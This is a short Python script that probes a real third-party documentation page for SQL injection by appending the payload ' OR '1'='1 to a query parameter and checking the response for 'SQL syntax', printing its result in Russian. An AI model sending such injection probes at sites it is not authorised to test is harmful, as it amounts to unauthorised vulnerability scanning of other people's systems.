import requests

url = "https://kivy.org/doc/stable/gettingstarted/installation.html?param=' OR '1'='1"
response = requests.get(url)

if "SQL syntax" in response.text:
    print("Потенциальная уязвимость SQL инъекции найдена!")
else:
    print("SQL инъекции, вероятно, нет.")
